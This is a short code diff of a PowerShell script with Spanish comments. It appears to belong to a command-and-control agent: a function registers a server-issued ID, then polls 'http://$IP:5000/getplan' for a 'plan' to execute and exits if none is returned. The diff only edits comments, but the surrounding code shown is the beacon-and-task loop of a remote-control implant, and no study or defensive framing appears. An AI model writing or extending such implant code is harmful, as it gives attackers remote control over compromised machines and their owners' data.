@@ -83,7 +83,7 @@ function consola
     else{
 
 
-
+        #Sustitución de la variable ID por el id generado en el servidor
         $global:id = "$ID"
         $global:id = "P"+$global:id
 
@@ -106,7 +106,7 @@ function consola
             #Preguntamos si hay plan
             $plan = invoke-webrequest -UseBasicParsing -Method POST -body @{id=$global:id} "http://$IP:5000/getplan"
 
-            #Si hay plan ejecutamos, si no dormimos
+            #Si hay plan ejecutamos, si no, terminamos
             if($plan.content.equals("false"))
             {
                 exit
